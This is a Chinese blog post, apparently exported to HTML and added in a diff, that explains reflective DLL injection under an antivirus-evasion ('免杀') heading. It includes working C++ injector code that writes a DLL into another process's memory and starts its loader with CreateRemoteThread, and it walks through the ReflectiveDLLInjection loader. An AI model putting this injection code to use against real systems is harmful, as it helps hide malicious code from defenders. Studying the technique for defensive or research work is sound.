@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-【免杀】反射式DLL注入详解</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepogithub.css">
+<link rel="stylesheet" href="/TestRepospeciou.css"
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepoarchives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<div class="typora-export os-windows"><div id="write" class>
+<p><strong>2025-1-1 14:50:28</strong></p>
+<p>公众号：https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A</p>
+<!--more-->
+<p>或许我们的公众号会有更多你感兴趣的内容</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p>
+<h1>【免杀】反射式DLL注入详解</h1>
+<p>在前文：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">PE文件格式解析</a>、<a href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">常见的DLL和Shellcode注入方式</a>中已经讲解了基本的注入方式和PE文件结构。那么我们可以提出这样指一种注入方式：将dll的内容放到目标进程中，然后找到这个dll完成PE映射到内存的函数（假设为<code>void loader()</code>），这也要求<code>loader</code>函数一定要在导出表上。</p>
+<ol>
+<li>获得dll<code>loader</code>函数在内存中的虚拟地址</li>
+<li>注入器将dll写入目标进程然后调用<code>loader</code></li>
+<li>loader运行</li>
+</ol>
+<h2>注入器编写</h2>
+<ol>
+<li>
+<p>打开dll文件</p>
+<pre><code class="language-cpp">    std::string path;
+    DWORD pid;
+    std::cout &lt;&lt; &quot;[+] pid: &quot;;
+    scanf_s(&quot;%d&quot;, &amp;pid);
+	std::cin.ignore();
+    std::cout &lt;&lt; &quot;[+] DLL Path: &quot;;
+    std::getline(std::cin, path);
+
+    //1.打开dll文件
+    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cout &lt;&lt; &quot;Create File Failed\n&quot;;
+        return 0;
+    }
+
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    if (dwFileSize == 0) {
+        std::cout &lt;&lt; &quot;File Size is Zero!\n&quot;;
+        CloseHandle(hFile);
+        return 0;
+    }
+</code></pre>
+</li>
+<li>
+<p>将dll写入到目标进程</p>
+<pre><code class="language-cpp">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == INVALID_HANDLE_VALUE) {
+        std::cout &lt;&lt; &quot;Allocate Address or Open Process Failed\n&quot;;
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (pBase == NULL) {
+        std::cout &lt;&lt; &quot;Allocate Memory Failed\n&quot;;
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return 0;
+    }
+
+    SIZE_T dwWriteSize = 0;
+    char* buffer = new char[dwFileSize];
+    DWORD dwReadSize;
+    if (ReadFile(hFile, buffer, dwFileSize, &amp;dwReadSize, NULL) == FALSE) {
+        std::cout &lt;&lt; &quot;Failed to read the file.\n&quot;;
+        delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return 0;
+    }
+    bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);
+    if (dwWriteSize != dwFileSize) {
+        std::cout &lt;&lt; &quot;File Load partitially\n&quot;;
+        delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return 0;
+    }
+</code></pre>
+</li>
+<li>
+<p>获得<code>loader</code>函数地址</p>
+<p>按照之前提到的pe格式，就是从<code>IMAGE_DATA_DIRECTORY</code>的导出表中，利用<code>FirstThunk</code>进行遍历，如果字符串匹配，就根据结构体的相关变量找到函数地址</p>
+<p>首先是得到RVA转换的函数</p>
+<pre><code class="language-cpp">DWORD VA2RVA(DWORD64 dwRva, DWORD64 BaseAddress) {
+    DWORD64 VA = 0;
+    DWORD64 RVA = 0;
+    DWORD64 sectionHeader;
+
+    DWORD64 ntheader = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)-&gt;e_lfanew;
+    WORD sectionNum = ((PIMAGE_NT_HEADERS64)ntheader)-&gt;FileHeader.NumberOfSections;
+
+    for (size_t i = 0; i &lt; sectionNum; i++)
+    {
+        sectionHeader = ntheader + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER);
+        if (((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress &gt; dwRva)
+            break;
+        VA = ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress;
+        RVA = dwRva - VA + ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;PointerToRawData;
+    }
+
+    return RVA;
+}
+</code></pre>
+<p>这里需要说明下<code>IMAGE_EXPORT_DIRECTORY</code>导出表目录结构体</p>
+<pre><code class="language-c">//@[comment(&quot;MVI_tracked&quot;)]
+typedef struct _IMAGE_EXPORT_DIRECTORY {
+    DWORD   Characteristics;
+    DWORD   TimeDateStamp;
+    WORD    MajorVersion;
+    WORD    MinorVersion;
+    DWORD   Name;
+    DWORD   Base;
+    DWORD   NumberOfFunctions;
+    DWORD   NumberOfNames;
+    DWORD   AddressOfFunctions;     // RVA from base of image
+    DWORD   AddressOfNames;         // RVA from base of image
+    DWORD   AddressOfNameOrdinals;  // RVA from base of image
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+</code></pre>
+<ul>
+<li><code>AddressOfNames</code>：函数名称地址DWORD数组，需要RVA</li>
+<li><code>AddressOfFunctions</code>：Export函数地址DWORD数组，需要RVA</li>
+<li><code>AddressOfNameOrdinals</code>：这是WORD数组，举个例子：目前存在着两个数组，<code>AddressOfNames[i]</code>和<code>AddressOfFunctions[j]</code>，<code>AddressOfNameOrdinals</code>存在的意义就是可以通过下标<code>i</code>找到另一个<code>j</code>，类似数据库中的<strong>关系表</strong></li>
+</ul>
+<p>拿到<code>AddressOfNames</code>去比较得到<code>i</code>，然后使用<code>i</code>从<code>AddressOfNameOrdinals</code>得到<code>j</code>，最后使用<code>j</code>从<code>AddressOfFunctions</code>找到函数地址</p>
+<p>注意得是<code>AddressOfNames</code>是一个DWORD数组，并且需要根据DWORD数据重定位才能得到函数名。</p>
+<pre><code class="language-cpp">DWORD64 getFunctionOffset(HANDLE peBuffer, const char* funcionName) {
+    DWORD64 dosHeader = (DWORD64)peBuffer;
+    DWORD64 ntHeader = dosHeader + ((PIMAGE_DOS_HEADER)peBuffer)-&gt;e_lfanew;
+
+    //导入目录
+    DWORD64 eatDVA = ((PIMAGE_NT_HEADERS64)ntHeader)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+    DWORD64 exportDirRVA = VA2RVA(eatDVA, dosHeader) + dosHeader;
+    DWORD64 exportNameAddr = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNames, dosHeader) + dosHeader;
+    DWORD64 exportFuncAddr = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfFunctions, dosHeader) + dosHeader;
+    DWORD64 exportOrdinals = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNameOrdinals, dosHeader) + dosHeader;
+
+    DWORD sumNames = ((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;NumberOfNames;
+
+    //1.遍历找到i
+    for (size_t i = 0; i &lt; sumNames; i++)
+    {
+        char* cpExportedFunctionName = (char*)(dosHeader + VA2RVA((PDWORD(exportNameAddr))[i], dosHeader));
+        std::cout &lt;&lt; &quot;func: &quot; &lt;&lt; cpExportedFunctionName &lt;&lt; &quot;\n&quot;;
+        if (strstr(cpExportedFunctionName, funcionName)) {
+            exportFuncAddr += (PWORD(exportOrdinals)[i]);
+            return  VA2RVA(PDWORD(exportFuncAddr)[0], dosHeader);
+        }
+    }
+
+    return 0;
+
+}
+</code></pre>
+</li>
+<li>
+<p>在远程进程中加载</p>
+<pre><code class="language-cpp">    DWORD64 loaderFuncAddr = getFunctionOffset(buffer, &quot;loader&quot;);
+    if (loaderFuncAddr == 0) {
+        std::cout &lt;&lt; &quot;Get Export Function Error\n&quot;;
+        delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return 0;
+    }
+    LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(
+        reinterpret_cast&lt;ULONG_PTR&gt;(pBase) + loaderFuncAddr
+        );
+
+    HANDLE hThread = NULL;
+    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
+        std::cout &lt;&lt; &quot;Create Thread Failed\n&quot;;
+        delete[] buffer;
+        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return 0;
+    }
+    WaitForSingleObject(hThread, 500);
+
+    delete[] buffer;
+    VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+</code></pre>
+</li>
+</ol>
+<p>这里我是用 https://github.com/stephenfewer/ReflectiveDLLInjection 的DLL进行测试，函数名为<code>ReflectiveLoader</code></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151719965.png" alt="image-20250103214642081" /></p>
+<h2>关于PEB</h2>
+<p>PEB：process environment block，处理环境块。可以参考：https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb</p>
+<pre><code class="language-cpp">typedef struct _PEB {
+//...
+  BYTE                          BeingDebugged;
+//...
+  PPEB_LDR_DATA                 Ldr;
+//...
+} PEB, *PPEB;
+</code></pre>
+<ul>
+<li><code>BeingDebugged</code>：当前是否被调试，反调试和反反调试常用</li>
+<li><code>Ldr</code>：该结构包含有关进程已加载模块的信息</li>
+</ul>
+<pre><code class="language-cpp">typedef struct _PEB_LDR_DATA
+{
+   DWORD dwLength;
+   DWORD dwInitialized;
+   LPVOID lpSsHandle;
+   LIST_ENTRY InLoadOrderModuleList;
+   LIST_ENTRY InMemoryOrderModuleList;
+   LIST_ENTRY InInitializationOrderModuleList;
+   LPVOID lpEntryInProgress;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+</code></pre>
+<p>当程序每加载一个dll的时候，就会添加到<code>InMemoryOrderModuleList</code>中（三个<code>LIST_ENTRY</code>都会添加），<code>LIST_ENTRY</code>可以被解析为<code>LDR_DATA_TABLE_ENTRY</code>，因为数据间隔对的上...所以很抽象</p>
+<pre><code class="language-cpp">typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InMemoryOrderLinks;
+//...   
+    PVOID DllBase;
+//...
+    UNICODE_STRING FullDllName;
+//...
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+</code></pre>
+<p>通过<code>FullDllName</code>可以得到当前dll的完整名称（带有路径），同时<code>DllBase</code>指向该dll的基地址（即加入到内存中的其实地址）</p>
+<h2>DLL编写</h2>
+<p>首先就是loader函数，由于我们是在PE文件没有完成映射到内存时进行调用的，那么这段函数本质上和shellcode一样是一段地址无关代码。我们应该明确这段函数能执行以下任务：</p>
+<ul>
+<li>获得当前内存地址，方便后续解析PE文件</li>
+<li>从<code>peb-&gt;ldr</code>获得相关函数，如<code>GetProcAddress</code>、<code>VirtualAlloc</code>、<code>Loadlibrary</code>等</li>
+<li>解析PE文件得到完成映射后的大小并<code>VirtualAlloc</code>分配内存</li>
+<li>完成Section段的映射</li>
+<li>遍历导入表，使用<code>Loadlibrary</code>加载本dll所需要的各种函数</li>
+<li>处理重定位</li>
+<li>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行</li>
+</ul>
+<p>整个过程也是非常枯燥的，以https://github.com/stephenfewer/ReflectiveDLLInjection 举例</p>
+<ol>
+<li>
+<p>获得当前内存地址，方便后续解析PE文件。首先我们要得到当前PE文件的起始部分， 项目是通过<code>#pragma intrinsic</code>返回函数调用的返回地址，然后判断DOS头和NT头是否匹配来逐步调整，得到PE文件起始地址<code>fileBase</code>。</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151727369.png" alt="image-20250105153732219" /></p>
+</li>
+<li>
+<p>从<code>peb-&gt;ldr</code>获得相关函数。项目为了做到良好的兼容性使用的是<code>__readgsqword</code>和<code>_MoveFromCoprocessor</code>（ARM），函数的作用是从相对于 GS 段开头的偏移量指定的位置读取内存，比如在GS偏移为0x60的位置就是<code>PEB</code>存放的位置，通过遍历PEB中的LDR可以找到所有被加载的dll的相关信息，甚至是在内存中未被映射的PE文件，例如：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151733174.png" alt="image-20250105154150671" /></p>
+<p>项目的这一步做的过程是差不多的，</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151737533.png" alt="image-20250105154538122" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151741450.png" alt="image-20250105154515644" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151745741.png" alt="image-20250105155234308" /></p>
+<p>通过解析<code>kernel32.dll</code>，<code>ntdll.dll</code>的在内存中PE文件，计算出<code>LoadLibraryA</code>，<code>GetProAddress</code>，<code>VritualAlloc</code>，<code>NtFlushInstructionCache</code>三个函数在内存中的位置，便于后续调用。这里的<code>NtFlushInstructionCache</code>函数，用于刷新指定进程的指令缓存</p>
+<pre><code class="language-cpp">NTSTATUS NtFlushInstructionCache(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    SIZE_T RegionSize
+);
+</code></pre>
+<p>如果是在用户层使用的话是封装在<code>kernel32.dll</code>的<code>FlushInstructionCache</code>中的，不过直接调用可以避免一些不必要的“检查”</p>
+</li>
+<li>
+<p>完成映射。现在我们得到了当前dll的PE文件起始位置，可以通过NT头中<code>OptionalHeader</code>的<code>SizeOfImage</code>得到完成映射所需要的空间大小，然后用步骤2中找到的<code>VirtualAlloc</code>申请空间，得到内存映射的起始地址<code>memBase</code>。然后先把DOS头和NT头复制过去，当然头的大小也是由<code>OptionalHeader</code>的<code>SizeOfHeaders</code>可以得到的</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151750633.png" alt="image-20250105155757072" /></p>
+</li>
+<li>
+<p>完成Section段的映射</p>
+<p>这里就不得不复习Section头的结构体了</p>
+<pre><code class="language-cpp">typedef struct _IMAGE_SECTION_HEADER {
+    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
+    union {
+            DWORD   PhysicalAddress;
+            DWORD   VirtualSize;
+    } Misc;
+    DWORD   VirtualAddress;
+    DWORD   SizeOfRawData;
+    DWORD   PointerToRawData;
+    DWORD   PointerToRelocations;
+    DWORD   PointerToLinenumbers;
+    WORD    NumberOfRelocations;
+    WORD    NumberOfLinenumbers;
+    DWORD   Characteristics;
+ } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
+</code></pre>
+<p>完成映射的首要问题就是：从哪里，到哪里，走多少。对应的就是从<code>fileBase</code>+<code>PointerToRawData</code>到<code>memBase</code>+<code>VirtualAddress</code>，复制<code>SizeOfRawData</code>大小</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151755783.png" alt="image-20250105160856920" /></p>
+</li>
+<li>
+<p>遍历导入表。为了便于分析再次展示<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p>
+<pre><code class="language-cpp"> typedef struct _IMAGE_IMPORT_DESCRIPTOR {
+    union {
+        DWORD   Characteristics;         
+        DWORD   OriginalFirstThunk;
+    } DUMMYUNIONNAME;
+    DWORD   TimeDateStamp; 
+    DWORD   ForwarderChain;
+    DWORD   Name;
+    DWORD   FirstThunk;
+} IMAGE_IMPORT_DESCRIPTOR;
+ typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
+</code></pre>
+<ul>
+<li><code>OriginalFirstThunk</code>：导入名称表的RVA地址</li>
+<li><code>Name</code>：DLL（映像文件）名称</li>
+<li><code>FirstThunk</code>：导入地址表的RVA地址</li>
+</ul>
+<p>根据之前我们对PE文件格式的分析，我们首先得到的是DLL的文件名，这时候便可用之前找到的<code>LoadLibraryA</code>去加载这些<strong>我们DLL需要的DLL</strong></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151801023.png" alt="image-20250105164438130" /></p>
+<p>接着很自然的想到使用<code>GetProAddress</code>去加载这些函数。具体过程是从<code>FirstThunk</code>中获得<code>IMAGE_IMPORT_BY_NAME </code>，得到函数名称后使用<code>GetProAddress</code>得到函数地址，最后存储到<code>fileBase</code>+<code>PIMAGE_IMPORT_DESCRIPTOR.FirstThunk</code>上。</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151804670.png" alt="image-20250105171719814" /></p>
+<p>项目这里对于其他从<code>OriginalFirstThunk</code>开始的情况进行了解析，但是核心思路是一致的。</p>
+</li>
+<li>
+<p>处理重定位。这里有之前PE文件没有说的<code>PIMAGE_BASE_RELOCATION</code>（主要是之前的例子是EXE）</p>
+<p>为什么DLL需要重定位？每个DLL最初被设计时，编译器会为其分配一个<strong>首选加载地址</strong>（Preferred Base Address），这通常是一个固定的虚拟内存地址。当多个DLL被加载到同一个进程的地址空间时，如果多个DLL的首选加载地址发生冲突（即两个DLL都希望加载到同一个内存地址），<strong>操作系统无法直接将它们加载到相同的地址</strong>，为了避免这种冲突，操作系统会将其中一个或多个DLL加载到其他地址，这就需要对代码中的绝对地址进行<strong>重定位</strong>。</p>
+<p>他保存在NT头的<code>OptionalHeader.DataDirectory</code>中，结构体如下</p>
+<pre><code class="language-cpp">//@[comment(&quot;MVI_tracked&quot;)]
+typedef struct _IMAGE_BASE_RELOCATION {
+    DWORD   VirtualAddress;
+    DWORD   SizeOfBlock;
+//  WORD    TypeOffset[1];
+} IMAGE_BASE_RELOCATION;
+typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
+</code></pre>
+<ul>
+<li><code>VirtualAddress</code>：待修正的数据的起始RVA</li>
+<li><code>SizeOfBlock</code>：要修正的区块数目</li>
+</ul>
+<p>在PE格式中一个<code>IMAGE_BASE_RELOCATION</code>数组展现的，这也方便我们进行遍历，最后一个全部成员变量都为0，所以计算要重定位的区块数目的时候记得**-1**。</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151810484.png" alt="image-20250105173117037" /></p>
+<p>如何进行修正？<code>PIMAGE_BASE_RELOCATION</code>有一个隐藏的成员<code>TypeOffset</code>，可以通过<code>IMAGE_BASE_RELOCATION+ sizeof(IMAGE_BASE_RELOCATION)</code>找到，可以被解析为</p>
+<pre><code class="language-cpp">typedef struct
+{
+	WORD	offset:12;
+	WORD	type:4;
+} IMAGE_RELOC, *PIMAGE_RELOC;
+</code></pre>
+<p>其中重定位的类型主要是构架的不同导致的，如32位和64位</p>
+<pre><code class="language-cpp">//
+// Based relocation types.
+//
+
+#define IMAGE_REL_BASED_ABSOLUTE              0
+#define IMAGE_REL_BASED_HIGH                  1
+#define IMAGE_REL_BASED_LOW                   2
+#define IMAGE_REL_BASED_HIGHLOW               3
+#define IMAGE_REL_BASED_HIGHADJ               4
+#define IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5
+#define IMAGE_REL_BASED_RESERVED              6
+#define IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7
+#define IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8
+#define IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9
+#define IMAGE_REL_BASED_DIR64                 10
+</code></pre>
+<p>在NT头的可选头(OptionalHeader)中有<code>ImageBase</code>，他是dll加载到内存中的第一个字节的首选地址。那么所有待重定位的数据都是根据这个值相对偏移，比如<code>ImageBase=0x1000</code>，现在有个数据默认是在<code>ImageBase</code>偏移的<code>0x10</code>，即理想中的<code>0x1010</code>的位置，文件中的记录就是<code>0x1010</code>；但是现在<code>ImageBase</code>变为了<code>0x2000</code>，那么重定位的位置就是<code>0x2010</code>，由此得到公式：<code>newData = oldData-ImageBase+newMemoryAddress</code>。</p>
+<p><strong>重定位的方式</strong>就是在原来的<code>VirtualAddress</code>+<code>IMAGE_RELOC.offset</code>地址中的值加上<code>memBase-ImageBase</code></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151816169.png" alt="image-20250105175336157" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151820285.png" alt="image-20250105173759085" /></p>
+</li>
+<li>
+<p>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行。这几乎是最简单的一步了，直接在NT头的可选头(OptionalHeader)中的<code>AddressOfEntryPoint</code>可以得到，这也是PE文件格式分析中强调过的，就是得算一下偏移；最后刷新指令集缓存（可以忽略，但是会增大dll调用失败概率），跳转到程序入口点<code>AddressOfEntryPoint</code>执行（DLL的就为<code>DllMain</code>了）</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151824472.png" alt="image-20250105183441641" /></p>
+</li>
+</ol>
+
+</div>
+</div></body>
